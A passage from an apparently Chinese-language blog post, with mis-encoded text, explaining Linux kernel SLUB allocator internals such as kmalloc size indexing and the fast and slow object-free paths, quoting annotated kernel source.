class="hljs-number">192</span>) &#123;<br><span class="hljs-keyword">if</span> (!size)<br><span class="hljs-keyword">return</span> ZERO_SIZE_PTR;<br><br>index = size_index[size_index_elem(size)];<br>&#125; <span class="hljs-keyword">else</span> &#123;<br><span class="hljs-keyword">if</span> (WARN_ON_ONCE(size &gt; KMALLOC_MAX_CACHE_SIZE))<br><span class="hljs-keyword">return</span> <span class="hljs-literal">NULL</span>;<br>index = fls(size - <span class="hljs-number">1</span>);<br>&#125;<br><br><span class="hljs-keyword">return</span> kmalloc_caches[kmalloc_type(flags)][index];<br>&#125;<br></code></pre></td></tr></table></figure><p><code>size_index</code> å’Œ <code>size_index_elem()</code> çš„å®šä¹‰éƒ½éå¸¸ç®€å•ç²—æš´ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">/*</span><br><span class="hljs-comment"> * Conversion table for small slabs sizes / 8 to the index in the</span><br><span class="hljs-comment"> * kmalloc array. This is necessary for slabs &lt; 192 since we have non power</span><br><span class="hljs-comment"> * of two cache sizes there. The size of larger slabs can be determined using</span><br><span class="hljs-comment"> * fls.</span><br><span class="hljs-comment"> */</span><br><span class="hljs-type">static</span> u8 size_index[<span class="hljs-number">24</span>] __ro_after_init = &#123;<br><span class="hljs-number">3</span>,<span class="hljs-comment">/* 8 */</span><br><span class="hljs-number">4</span>,<span class="hljs-comment">/* 16 */</span><br><span class="hljs-number">5</span>,<span class="hljs-comment">/* 24 */</span><br><span class="hljs-number">5</span>,<span class="hljs-comment">/* 32 */</span><br><span class="hljs-number">6</span>,<span class="hljs-comment">/* 40 */</span><br><span class="hljs-number">6</span>,<span class="hljs-comment">/* 48 */</span><br><span class="hljs-number">6</span>,<span class="hljs-comment">/* 56 */</span><br><span class="hljs-number">6</span>,<span class="hljs-comment">/* 64 */</span><br><span class="hljs-number">1</span>,<span class="hljs-comment">/* 72 */</span><br><span class="hljs-number">1</span>,<span class="hljs-comment">/* 80 */</span><br><span class="hljs-number">1</span>,<span class="hljs-comment">/* 88 */</span><br><span class="hljs-number">1</span>,<span class="hljs-comment">/* 96 */</span><br><span class="hljs-number">7</span>,<span class="hljs-comment">/* 104 */</span><br><span class="hljs-number">7</span>,<span class="hljs-comment">/* 112 */</span><br><span class="hljs-number">7</span>,<span class="hljs-comment">/* 120 */</span><br><span class="hljs-number">7</span>,<span class="hljs-comment">/* 128 */</span><br><span class="hljs-number">2</span>,<span class="hljs-comment">/* 136 */</span><br><span class="hljs-number">2</span>,<span class="hljs-comment">/* 144 */</span><br><span class="hljs-number">2</span>,<span class="hljs-comment">/* 152 */</span><br><span class="hljs-number">2</span>,<span class="hljs-comment">/* 160 */</span><br><span class="hljs-number">2</span>,<span class="hljs-comment">/* 168 */</span><br><span class="hljs-number">2</span>,<span class="hljs-comment">/* 176 */</span><br><span class="hljs-number">2</span>,<span class="hljs-comment">/* 184 */</span><br><span class="hljs-number">2</span><span class="hljs-comment">/* 192 */</span><br>&#125;;<br><br><span class="hljs-type">static</span> <span class="hljs-keyword">inline</span> <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> <span class="hljs-title function_">size_index_elem</span><span class="hljs-params">(<span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> bytes)</span><br>&#123;<br><span class="hljs-keyword">return</span> (bytes - <span class="hljs-number">1</span>) / <span class="hljs-number">8</span>;<br>&#125;<br></code></pre></td></tr></table></figure><h2 id="ä¸‰ã€ä¸Šå±‚è°ƒç”¨æ¥å£å…³ç³»å›¾"><a href="#ä¸‰ã€ä¸Šå±‚è°ƒç”¨æ¥å£å…³ç³»å›¾" class="headerlink" title="ä¸‰ã€ä¸Šå±‚è°ƒç”¨æ¥å£å…³ç³»å›¾"></a>ä¸‰ã€ä¸Šå±‚è°ƒç”¨æ¥å£å…³ç³»å›¾</h2><p>å› ä¸ºå¾ˆå¤šæ¯”å¦‚è¯´ <code>__kmem_cache_alloc_lru()</code> ä¸€ç±»çš„å‡½æ•°å…¶å®æœ€åéƒ½æ˜¯å¯¹ <code>slab_alloc_node()</code> çš„å¥—å¨ƒï¼Œè¿™é‡Œç¬”è€…ç›´æ¥ç»™å‡ºä¸€ä¸ªç®€æ˜“çš„è°ƒç”¨å…³ç³»å›¾ï¼š</p><blockquote><p>åªæˆªå–äº†ç¬”è€…è®¤ä¸ºæ¯”è¾ƒä¸»è¦çš„é‚£äº›ï¼Œ<del>å› ä¸ºä½œå›¾ä½œåˆ°åé¢å®åœ¨èšŒåŸ ä½äº†</del></p></blockquote><p><img src="https://s2.loli.net/2023/02/22/wCchFdIZLOn3m7W.png" alt="image.png"></p><h1 id="0x03-å¯¹è±¡çš„é‡Šæ”¾"><a href="#0x03-å¯¹è±¡çš„é‡Šæ”¾" class="headerlink" title="0x03. å¯¹è±¡çš„é‡Šæ”¾"></a>0x03. å¯¹è±¡çš„é‡Šæ”¾</h1><h2 id="â€»-ä¸€ã€do-slab-free-ï¼šå‘æŒ‡å®šçš„-kmem-cache-é‡Šæ”¾å¯¹è±¡ï¼ˆé“¾ï¼‰"><a href="#â€»-ä¸€ã€do-slab-free-ï¼šå‘æŒ‡å®šçš„-kmem-cache-é‡Šæ”¾å¯¹è±¡ï¼ˆé“¾ï¼‰" class="headerlink" title="â€» ä¸€ã€do_slab_free()ï¼šå‘æŒ‡å®šçš„ kmem_cache é‡Šæ”¾å¯¹è±¡ï¼ˆé“¾ï¼‰"></a>â€» ä¸€ã€do_slab_free()ï¼šå‘æŒ‡å®šçš„ kmem_cache é‡Šæ”¾å¯¹è±¡ï¼ˆé“¾ï¼‰</h2><p>åœ¨ slab allocator ä¸­å­˜åœ¨ç€å¤šä¸ªä¸åŒçš„å†…å­˜é‡Šæ”¾æ¥å£ï¼Œå…¶æœ€åéƒ½ä¼šè°ƒç”¨åˆ° <code>do_slab_free()</code> å®Œæˆå†…å­˜é‡Šæ”¾çš„å·¥ä½œï¼Œéœ€è¦æ³¨æ„çš„æ˜¯è¯¥å‡½æ•°  <em><strong>å…è®¸é‡Šæ”¾å·²ç»è¿æ¥æˆä¸€æ¡ freelist ä¸”å·²ç»åŠ å¯†å¥½çš„å¤šä¸ªå¯¹è±¡</strong></em>  ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">/*</span><br><span class="hljs-comment"> * å¼ºåˆ¶å†…è”å¿«é€Ÿè·¯å¾„ä»¥åˆ›é€ æ— éœ€é¢å¤–çš„å‡½æ•°è°ƒç”¨ä¾¿èƒ½å®Œæˆå¿«é€Ÿè·¯å¾„é‡Šæ”¾çš„kfree&amp;kmem_cache_free.</span><br><span class="hljs-comment"> *</span><br><span class="hljs-comment"> * å¿«é€Ÿè·¯å¾„ä»…åœ¨æˆ‘ä»¬è¦é‡Šæ”¾ä¼šå½“å‰ cpu slab æ—¶ç”Ÿæ•ˆ.</span><br><span class="hljs-comment"> * è¿™é€šå¸¸æ˜¯åœ¨æˆ‘ä»¬åˆšåˆšåˆ†é…äº†è¯¥å¯¹è±¡çš„æƒ…å†µ.</span><br><span class="hljs-comment"> *</span><br><span class="hljs-comment"> * è‹¥å¿«é€Ÿè·¯å¾„ä¸å¯ç”¨åˆ™é€€å› __slab_free ä»¥å¤„ç†æ‰€æœ‰ç§ç±»çš„ç‰¹æ®Šå¤„ç†.</span><br><span class="hljs-comment"> *</span><br><span class="hljs-comment"> * é€šè¿‡æŒ‡å®š head &amp; tail æŒ‡é’ˆ åŠ ä¸Šå¯¹è±¡æ•°é‡ï¼ˆcntï¼‰ï¼Œå¯ä»¥å¤§é‡é‡Šæ”¾åŒ…å«å¤šä¸ªå¯¹è±¡çš„freelist.</span><br><span class="hljs-comment"> * Bulk free indicated by tail pointer being set.</span><br><span class="hljs-comment"> */</span><br><span class="hljs-type">static</span> __always_inline <span class="hljs-type">void</span> <span class="hljs-title function_">do_slab_free</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> kmem_cache *s,</span><br><span class="hljs-params"><span class="hljs-keyword">struct</span> slab *slab, <span class="hljs-type">void</span> *head, <span class="hljs-type">void</span> *tail,</span><br><span class="hljs-params"><span class="hljs-type">int</span> cnt, <span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> addr)</span><br>&#123;<br><span class="hljs-type">void</span> *tail_obj = tail ? : head;<br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">kmem_cache_cpu</span> *<span class="hljs-title">c</span>;</span><br><span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> tid;<br><span class="hljs-type">void</span> **freelist;<br></code></pre></td></tr></table></figure><p>ä¸åˆ†é…ç±»ä¼¼ï¼Œé‡Šæ”¾åŒæ ·åˆ†ä¸ºå¿«é€Ÿè·¯å¾„ä¸æ…¢é€Ÿè·¯å¾„</p><h3 id="I-ç›´æ¥é‡Šæ”¾å›-percpu-slabï¼ˆfast-pathï¼‰"><a href="#I-ç›´æ¥é‡Šæ”¾å›-percpu-slabï¼ˆfast-pathï¼‰" class="headerlink" title="I. ç›´æ¥é‡Šæ”¾å› percpu slabï¼ˆfast pathï¼‰"></a>I. ç›´æ¥é‡Šæ”¾å› percpu slabï¼ˆfast pathï¼‰</h3><p>å¿«é€Ÿè·¯å¾„æ¯”è¾ƒç®€å•ï¼Œä¸»è¦å°±æ˜¯<strong>å¯¹æ¯”å¾…é‡Šæ”¾å¯¹è±¡æ‰€å± slab æ˜¯å¦ä¸º percpu slabï¼Œè‹¥æ˜¯åˆ™ç›´æ¥æŒ‚å›å»å³å¯ï¼Œéµå¾ª LIFO æœºåˆ¶</strong>ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><code class="hljs c">redo:<br><span class="hljs-comment">/*</span><br><span class="hljs-comment"> * ç¡®å®šå½“å‰çš„ per cpu slab. </span><br><span class="hljs-comment"> * cpu å¯èƒ½åœ¨ä¹‹åæ”¹å˜.ä½†ç”±äºæ•°æ®å·²ç»é€šè¿‡è¯¥æŒ‡é’ˆè·å¾—ï¼Œè¿™å¹¶æ²¡é—®é¢˜.</span><br><span class="hljs-comment"> * è‹¥æˆ‘ä»¬åœ¨ cmpxchg æœŸé—´åœ¨åŒä¸€ cpu ä¸Šï¼Œé‡Šæ”¾å°†ä¼šæˆåŠŸ.</span><br><span class="hljs-comment"> */</span><br>c = raw_cpu_ptr(s-&gt;cpu_slab);<br>tid = READ_ONCE(c-&gt;tid);<br><br><span class="hljs-comment">/* ä¸ slab_alloc_node() ä¸­åœ¨ barrier() ä¸Šçš„æ³¨é‡Šä¸€æ · */</span><br>barrier();<br><br><span class="hljs-comment">// ä¸å±äº percpu slabï¼Œè°ƒç”¨ __slab_free() è¿›è¡Œé‡Šæ”¾</span><br><span class="hljs-keyword">if</span> (unlikely(slab != c-&gt;slab)) &#123;<br>__slab_free(s, slab, head, tail_obj, cnt, addr);<br><span class="hljs-keyword">return</span>;<br>&#125;<br><br><span class="hljs-keyword">if</span> (USE_LOCKLESS_FAST_PATH()) &#123;<br>freelist = READ_ONCE(c-&gt;freelist);<br><br><span class="hljs-comment">// ç›´æ¥å°† percpu freelist æ¥åˆ° tail_obj åé¢</span><br>set_freepointer(s, tail_obj, freelist);<br><br><span class="hljs-keyword">if</span> (unlikely(!this_cpu_cmpxchg_double(<br>s-&gt;cpu_slab-&gt;freelist, s-&gt;cpu_slab-&gt;tid,<br>freelist, tid,<br>head, next_tid(tid)))) &#123;<br><br>note_cmpxchg_failure(<span class="hljs-string">&quot;slab_free&quot;</span>, s, tid);<br><span class="hljs-keyword">goto</span> redo;<br>&#125;<br>&#125; <span class="hljs-keyword">else</span> &#123;<br><span class="hljs-comment">/* Update the free list under the local lock */</span><br>local_lock(&amp;s-&gt;cpu_slab-&gt;lock);<br>c = this_cpu_ptr(s-&gt;cpu_slab);<br><span class="hljs-keyword">if</span> (unlikely(slab != c-&gt;slab)) &#123;<br>local_unlock(&amp;s-&gt;cpu_slab-&gt;lock);<br><span class="hljs-keyword">goto</span> redo;<br>&#125;<br>tid = c-&gt;tid;<br>freelist = c-&gt;freelist;<br><br><span class="hljs-comment">// ç›´æ¥å°† percpu freelist æ¥åˆ° tail_obj åé¢</span><br>set_freepointer(s, tail_obj, freelist);<br>c-&gt;freelist = head;<br>c-&gt;tid = next_tid(tid);<br><br>local_unlock(&amp;s-&gt;cpu_slab-&gt;lock);<br>&#125;<br>stat(s, FREE_FASTPATH);<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="II-slab-free-ï¼šé‡Šæ”¾å›å¯¹åº”çš„-slabï¼ˆslow-pathï¼‰"><a href="#II-slab-free-ï¼šé‡Šæ”¾å›å¯¹åº”çš„-slabï¼ˆslow-pathï¼‰" class="headerlink" title="II. __slab_free()ï¼šé‡Šæ”¾å›å¯¹åº”çš„ slabï¼ˆslow pathï¼‰"></a>II. __slab_free()ï¼šé‡Šæ”¾å›å¯¹åº”çš„ slabï¼ˆslow pathï¼‰</h3><p>å¦‚æœå¾…é‡Šæ”¾å¯¹è±¡ä¸å±äº percpu clabï¼Œåˆ™è°ƒç”¨ <code>__slab_free()</code> è¿›è¡Œé‡Šæ”¾ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">/*</span><br><span class="hljs-comment"> * å¤„ç†æ…¢é€Ÿè·¯å¾„. è¿™å¯èƒ½ä¼šè¢«é¢‘ç¹è°ƒç”¨å› ä¸ºåœ¨å¤§éƒ¨åˆ†æƒ…å†µä¸‹å¯¹è±¡æ¯”cpu slabç”Ÿå‘½å‘¨æœŸæ›´é•¿</span><br><span class="hljs-comment"> *</span><br><span class="hljs-comment"> * æ‰€ä»¥æˆ‘ä»¬ä»å°è¯•å‡å°‘ç¼“å­˜è¡Œçš„ä½¿ç”¨ç‡. æ‹¿å– slab lock å¹¶é‡Šæ”¾å¯¹è±¡å³å¯.</span><br><span class="hljs-comment"> * è‹¥ä¸éœ€è¦é¢å¤–çš„ partial slab handling æˆ‘ä»¬ä¾¿å¯ç«‹å³è¿”å›.</span><br><span class="hljs-comment"> */</span><br><span class="hljs-type">static</span> <span class="hljs-type">void</span> __slab_free(<span class="hljs-keyword">struct</span> kmem_cache *s, <span class="hljs-keyword">struct</span> slab *slab,<br><span class="hljs-type">void</span> *head, <span class="hljs-type">void</span> *tail, <span class="hljs-type">int</span> cnt,<br><span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> addr)<br><br>&#123;<br><span class="hljs-type">void</span> *prior;<br><span class="hljs-type">int</span> was_frozen;<br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">slab</span> <span class="hljs-title">new</span>;</span><br><span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> counters;<br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">kmem_cache_node</span> *<span class="hljs-title">n</span> =</span> <span class="hljs-literal">NULL</span>;<br><span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> flags;<br><br>stat(s, FREE_SLOWPATH);<br></code></pre></td></tr></table></figure><p>é¦–å…ˆè¿˜æ˜¯ kfence å’Œ debug ç›¸å…³ï¼Œå¦‚æœè¯¥ <code>kmem_cache</code> è®¾ç½®äº† <code>SLAB_DEBUG_FLAGS</code> æ ‡å¿—ä½åˆ™ç›´æ¥è°ƒç”¨ <code>free_to_partial_list()</code> åè¿”å›å³å¯ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-keyword">if</span> (kfence_free(head))<br><span class="hljs-keyword">return</span>;<br><br><span class="hljs-keyword">if</span> (IS_ENABLED(CONFIG_SLUB_TINY) || kmem_cache_debug(s)) &#123;<br>free_to_partial_list(s, slab, head, tail, cnt, addr);<br><span class="hljs-keyword">return</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>ä¹‹åæ˜¯ä¸€ä¸ª <code>do while</code> å¾ªç¯ï¼Œé¦–å…ˆä¼šå°† <strong><code>å¾…é‡Šæ”¾ freelist æ‰€å± slab çš„ freelist</code></strong> è¿æ¥åˆ° <strong><code>å¾…é‡Šæ”¾ freelist çš„ tail object</code></strong> åè¾¹ï¼Œè¿™é‡Œçš„ <code>new</code> æ˜¯ä¸€ä¸ªæ ˆä¸Šçš„ä¸´æ—¶ slab ç»“æ„ä½“ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-keyword">do</span> &#123;<br><span class="hljs-keyword">if</span> (unlikely(n)) &#123;<br>spin_unlock_irqrestore(&amp;n-&gt;list_lock, flags);<br>n = <span class="hljs-literal">NULL</span>;<br>&#125;<br>prior = slab-&gt;freelist;<br>counters = slab-&gt;counters;<br>set_freepointer(s, tail, prior);<br>new.counters = counters;<br>was_frozen = new.frozen;<br>new.inuse -= cnt;<br></code></pre></td></tr></table></figure><p>æ¥ä¸‹æ¥æ£€æŸ¥æ˜¯å¦  <strong><code>(æ‰€æœ‰çš„å¯¹è±¡éƒ½*å°†*ä¸ºç©ºé—²å¯¹è±¡ || åŸ slab ä¸Šæ— ç©ºé—²å¯¹è±¡) &amp;&amp; slab æœªè¢«å†»ç»“</code></strong> ï¼Œè‹¥æ»¡è¶³è¯¥æ¡ä»¶åˆ™ï¼š</p><ul><li>æ£€æŸ¥æ˜¯å¦æœ‰ percpu partial slab ä¸”åŸ slab ä¸Šæ— ç©ºé—²å¯¹è±¡ï¼ˆå³ slab-&gt;freelistï¼ˆä¹Ÿå°±æ˜¯ä»£ç ä¸­çš„ <code>prior</code>ï¼‰ä¸º NULLï¼‰ï¼š<ul><li>è‹¥æ˜¯ï¼Œåˆ™è®¾ç½® slab å°†è¢«å†»ç»“ï¼ˆ<code>new.frozen=1</code>ï¼‰</li><li>è‹¥å¦ï¼Œåˆ™è·å– slab æ‰€å¯¹åº”çš„ <code>kmem_cache_node</code></li></ul></li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-keyword">if</span> ((!new.inuse || !prior) &amp;&amp; !was_frozen) &#123;<br><br><span class="hljs-keyword">if</span> (kmem_cache_has_cpu_partial(s) &amp;&amp; !prior) &#123;<br><br><span class="hljs-comment">/*</span><br><span class="hljs-comment"> * Slab ä¹‹å‰ä¸åœ¨é“¾è¡¨ä¸Šä¸”å°†ä¼šéƒ¨åˆ†ä¸ºç©º</span><br><span class="hljs-comment"> * æˆ‘ä»¬å¯ä»¥æ¨è¿Ÿé“¾è¡¨ç§»åŠ¨ï¼Œè€Œæ˜¯åä¹‹å°†å…¶å†»ç»“.</span><br><span class="hljs-comment"> */</span><br>new.frozen = <span class="hljs-number">1</span>;<br><br>&#125; <span class="hljs-keyword">else</span> &#123; <span class="hljs-comment">/* éœ€è¦ä»ä¸€ä¸ªé“¾è¡¨ä¸Šå–ä¸‹ */</span><br><br>n = get_node(s, slab_nid(slab));<br><span class="hljs-comment">/*</span><br><span class="hljs-comment"> * æ¨æµ‹æ€§åœ°è·å– list_lock.</span><br><span class="hljs-comment"> * è‹¥ cmpxchg æœªæˆåŠŸï¼Œåˆ™æˆ‘ä»¬å¯èƒ½</span><br><span class="hljs-comment"> * åœ¨ä¸è¿›è¡Œä»»ä½•å¤„ç†çš„æƒ…å†µä¸‹æ”¾å¼ƒ list_lock.</span><br><span class="hljs-comment"> *</span><br><span class="hljs-comment"> * å¦åˆ™ list_lock å°†ä¸å…¶ä»–å¤„ç†å™¨åŒæ­¥æ›´æ–° slabs é“¾è¡¨</span><br><span class="hljs-comment"> */</span><br>spin_lock_irqsave(&amp;n-&gt;list_lock, flags);<br><br>&#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>å¾ªç¯çš„ç»ˆæ­¢æ¡ä»¶ç”¨äº†ä¸€ä¸ª <code>cmpxchg_double_slab()</code> å‡½æ•°ï¼Œ<del>å¥—å¨ƒå¥—å¾—ğŸ‘´å¤´æ˜çœ¼èŠ±</del>ï¼Œä¸»è¦é€»è¾‘ä¸ºï¼š</p><ul><li><strong>å¯¹æ¯” slab-&gt;freelist &#x3D;&#x3D; prior &amp;&amp; slab-&gt;counters &#x3D;&#x3D; countersï¼Œè‹¥æ˜¯ï¼Œåˆ™å°† slab-&gt;freelist è®¾ä¸º head ä¸”å°† slab-&gt;counters è®¾ä¸º new.counters</strong>ï¼Œè¯¥æ“ä½œæˆåŠŸåˆ™è¿”å› trueï¼Œæ¡ä»¶ä¸ç¬¦åˆ™è¿”å› false</li></ul><p>æˆåŠŸäº†å¾ªç¯å°†ä¼šç›´æ¥è·³å‡ºï¼šï¼‰</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs c">&#125; <span class="hljs-keyword">while</span> (!cmpxchg_double_slab(s, slab,<br>prior, counters,<br>head, new.counters,<br><span class="hljs-string">&quot;__slab_free&quot;</span>));<br></code></pre></td></tr></table></figure><p>æ¥ä¸‹æ¥æ£€æŸ¥<strong>è¯¥ slab æ˜¯å¦éœ€è¦ä»ä¸€ä¸ª <code>kmem_cache_node</code> çš„é“¾è¡¨ä¸Šå–ä¸‹ï¼Œè‹¥å¦ï¼Œ</strong>åˆ™ï¼š</p><ul><li>è‹¥ slab å·²ç»è¢«å†»ç»“ï¼Œstat() ä¸€ä¸‹ï¼ˆåŸºæœ¬ä¸Šç­‰äºå•¥éƒ½ä¸åšï¼‰</li><li>è‹¥ slab éœ€è¦è¢«å†»ç»“ ï¼ˆ<code>new.frozen</code> ä¸º trueï¼‰ï¼Œè°ƒç”¨ <code>put_cpu_partial()</code> ç›´æ¥å°† slab æ”¾åˆ° percpu partial é“¾è¡¨</li><li>é‡Šæ”¾å·¥ä½œå®Œæˆï¼Œè¿”å›</li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-keyword">if</span> (likely(!n)) &#123;<br><br><span class="hljs-keyword">if</span> (likely(was_frozen)) &#123;<br><span class="hljs-comment">/*</span><br><span class="hljs-comment"> * é“¾è¡¨é”æœªè¢«å ç”¨ï¼Œå› æ­¤ä¸éœ€è¦æ´»è·ƒä»»ä½•é“¾è¡¨.</span><br><span class="hljs-comment"> */</span><br>stat(s, FREE_FROZEN);<br>&#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (new.frozen) &#123;<br><span class="hljs-comment">/*</span><br><span class="hljs-comment"> * If we just froze the slab then put it onto the</span><br><span class="hljs-comment"> * per cpu partial list.</span><br><span class="hljs-comment"> */</span><br>put_cpu_partial(s, slab, <span class="hljs-number">1</span>);<br>stat(s, CPU_PARTIAL_FREE);<br>&#125;<br><br><span class="hljs-keyword">return</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>å¦‚æœ slab ä¸Šæ‰€æœ‰å¯¹è±¡éƒ½è¢«é‡Šæ”¾ï¼Œä¸” node ä¸Šçš„ partial slab æ•°é‡å·²ç»è¶…è¿‡ <code>kmem_cache-&gt;min_partial</code> ï¼Œ<strong>è¿™æ„å‘³ç€è¿™æ˜¯ä¸€å¼ å®Œå…¨ç©ºé—²çš„ slab</strong>ï¼Œæ¥ä¸‹æ¥è·³è½¬åˆ° <code>slab_empty</code> æ ‡ç­¾ï¼Œè¯¥æ ‡ç­¾å¯¹åº”ä»£ç å—ä¸»è¦æ˜¯ï¼š</p><ul><li>è‹¥ slab ä¸ŠåŸæ¥æœ‰ç©ºé—²å¯¹è±¡ï¼ˆä½äº node partial é“¾è¡¨ï¼‰ï¼Œåˆ™ä» partial é“¾è¡¨ç§»é™¤</li><li>è‹¥ slab ä¸ŠåŸæ¥æ— ç©ºé—²å¯¹è±¡ï¼ˆä½äº node full é“¾è¡¨ï¼‰ï¼Œåˆ™ä» full é“¾è¡¨ç§»é™¤</li><li><strong>æœ€åè°ƒç”¨ <code>discard_slab()</code> é‡Šæ”¾è¿™ä¸€å¼  slab</strong></li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-keyword">if</span> (unlikely(!new.inuse &amp;&amp; n-&gt;nr_partial &gt;= s-&gt;min_partial))<br><span class="hljs-keyword">goto</span> slab_empty;<br><br><span class="hljs-comment">//...</span><br><br>slab_empty:<br><span class="hljs-keyword">if</span> (prior) &#123;<br><span class="hljs-comment">/*</span><br><span class="hljs-comment"> * Slab on the partial list.</span><br><span class="hljs-comment"> */</span><br>remove_partial(n, slab);<br>stat(s, FREE_REMOVE_PARTIAL);<br>&#125; <span class="hljs-keyword">else</span> &#123;<br><span class="hljs-comment">/* Slab must be on the full list */</span><br>remove_full(s, n, slab);<br>&#125;<br><br>spin_unlock_irqrestore(&amp;n-&gt;list_lock, flags);<br>stat(s, FREE_SLAB);<br>discard_slab(s, 